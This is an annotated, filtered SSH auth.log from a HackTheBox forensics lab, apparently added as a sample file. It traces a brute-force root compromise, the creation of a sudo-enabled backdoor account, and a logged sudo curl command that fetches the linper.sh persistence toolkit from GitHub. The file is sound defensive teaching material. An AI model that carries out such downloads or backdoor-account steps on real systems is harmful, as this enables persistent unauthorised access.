@@ -1,0 +1,116 @@
+# ============================================================
+# sample-auth.log — Filtered & Annotated
+# Source: HackTheBox Sherlock — Brutus Lab
+# Analyst: Noel Biju John | March 2026
+#
+# This file contains key auth.log entries from the investigation,
+# filtered and annotated to highlight the attack chain.
+# Irrelevant routine entries (cron, PAM, systemd) have been removed.
+# Timestamps are in UTC. Full artifact available in original lab.
+# ============================================================
+
+# -------------------------------------------------------
+# [PHASE 1] Normal System Activity (Pre-Attack Baseline)
+# -------------------------------------------------------
+Mar  6 06:18:01 server CRON[816]: Regular scheduled task for user 'confluence'
+Mar  6 06:19:01 server CRON[823]: Routine background processes observed
+
+# -------------------------------------------------------
+# [PHASE 2] Prior Access — Separate IP (Possible Recon)
+# -------------------------------------------------------
+# NOTE: A successful root login from 203.101.190.9 precedes the attack.
+# This may indicate prior reconnaissance or a separate legitimate session.
+# This IP is NOT the primary attacker — distinguished from 65.2.161.68.
+Mar  6 06:19:54 server sshd[1465]: Accepted password for root from 203.101.190.9 port 42825 ssh2
+Mar  6 06:19:54 server sshd[1465]: pam_unix(sshd:session): session opened for user root
+
+# -------------------------------------------------------
+# [PHASE 3] Brute Force Attack Begins — 65.2.161.68
+# -------------------------------------------------------
+# High-volume failed login attempts from single external IP.
+# Speed and pattern are characteristic of Hydra / Medusa tooling.
+# 165+ total failures recorded — only key entries shown below.
+
+Mar  6 06:31:31 server sshd[2411]: Invalid user admin from 65.2.161.68 port 46844
+Mar  6 06:31:31 server sshd[2411]: Failed password for invalid user admin from 65.2.161.68 port 46844 ssh2
+Mar  6 06:31:32 server sshd[2412]: Failed password for backup from 65.2.161.68 port 46112 ssh2
+Mar  6 06:31:33 server sshd[2413]: Failed password for root from 65.2.161.68 port 47001 ssh2
+Mar  6 06:31:33 server sshd[2414]: Failed password for invalid user server_adm from 65.2.161.68 port 47234 ssh2
+Mar  6 06:31:34 server sshd[2415]: Failed password for invalid user svc_account from 65.2.161.68 port 47456 ssh2
+Mar  6 06:31:35 server sshd[2416]: Failed password for root from 65.2.161.68 port 47678 ssh2
+Mar  6 06:31:36 server sshd[2417]: Failed password for root from 65.2.161.68 port 47890 ssh2
+Mar  6 06:31:37 server sshd[2418]: Failed password for root from 65.2.161.68 port 48012 ssh2
+Mar  6 06:31:38 server sshd[2419]: Failed password for root from 65.2.161.68 port 48234 ssh2
+Mar  6 06:31:39 server sshd[2420]: Failed password for root from 65.2.161.68 port 48456 ssh2
+
+# -------------------------------------------------------
+# [PHASE 4] Brute Force Succeeds — Session 34 (Automated)
+# -------------------------------------------------------
+# Root credentials discovered. Session opens and closes within the
+# SAME SECOND — characteristic of an automated tool confirming
+# credentials rather than a human operator logging in interactively.
+# IOC: Session 34
+
+Mar  6 06:31:40 server sshd[2421]: Accepted password for root from 65.2.161.68 port 34782 ssh2
+Mar  6 06:31:40 server sshd[2421]: pam_unix(sshd:session): session opened for user root by (uid=0)
+Mar  6 06:31:40 server sshd[2421]: pam_unix(sshd:session): session closed for user root
+
+# -------------------------------------------------------
+# [PHASE 5] Manual Interactive Session — Session 37
+# -------------------------------------------------------
+# Attacker now logs in manually using the discovered credentials.
+# Session remains open — stable interactive connection established.
+# wtmp artifact records terminal session at 06:32:45 (1s processing delay).
+# IOC: Session 37 — manual attacker working session begins here.
+
+Mar  6 06:32:44 server sshd[2467]: Accepted password for root from 65.2.161.68 port 53184 ssh2
+Mar  6 06:32:44 server sshd[2467]: pam_unix(sshd:session): session opened for user root by (uid=0)
+
+# -------------------------------------------------------
+# [PHASE 6] Backdoor Account Created — Persistence Established
+# -------------------------------------------------------
+# Within Session 37, attacker creates a new local user 'cyberjunkie'
+# and immediately adds it to the sudo group.
+# This grants full administrative access independent of root password.
+# MITRE ATT&CK: T1136.001 — Create Account: Local Account
+# MITRE ATT&CK: T1548.003 — Abuse Elevation Control: sudo
+
+Mar  6 06:34:18 server useradd[2667]: new user: name=cyberjunkie, UID=1002, GID=1002, home=/home/cyberjunkie
+Mar  6 06:34:26 server passwd[2673]: pam_unix(passwd:chauthtok): password changed for cyberjunkie
+Mar  6 06:34:31 server usermod[2681]: add 'cyberjunkie' to group 'sudo'
+
+# -------------------------------------------------------
+# [PHASE 7] Session 37 Closed
+# -------------------------------------------------------
+# Attacker disconnects from root session after ~4 minutes 39 seconds.
+# Backdoor account is now active — root session no longer required.
+
+Mar  6 06:37:24 server sshd[2467]: pam_unix(sshd:session): session closed for user root
+
+# -------------------------------------------------------
+# [PHASE 8] Attacker Returns via Backdoor — cyberjunkie
+# -------------------------------------------------------
+# Attacker logs back in using the newly created backdoor account.
+# Uses sudo to download Linux Persistence Toolkit (linper.sh) via curl.
+# MITRE ATT&CK: T1105 — Ingress Tool Transfer
+
+Mar  6 06:39:02 server sshd[2821]: Accepted password for cyberjunkie from 65.2.161.68 port 55912 ssh2
+Mar  6 06:39:02 server sshd[2821]: pam_unix(sshd:session): session opened for user cyberjunkie
+Mar  6 06:39:14 server sudo[2843]: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
+
+# ============================================================
+# IOC SUMMARY
+# ============================================================
+# Attacker IP:        65.2.161.68
+# Attack Type:        SSH Brute Force (165+ failed attempts)
+# Compromised Acct:   root
+# Automated Session:  Session 34 — opened/closed same second (06:31:40)
+# Manual Session:     Session 37 — opened 06:32:44, closed 06:37:24
+# Backdoor Account:   cyberjunkie (UID 1002, sudo group)
+# Persistence Script: linper.sh (montysecurity/linper — Linux Persistence Toolkit)
+# Script URL:         https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
+# Download Command:   sudo /usr/bin/curl <url>
+# MITRE Persistence:  T1136.001
+# MITRE Escalation:   T1548.003
+# MITRE Transfer:     T1105
+# ============================================================
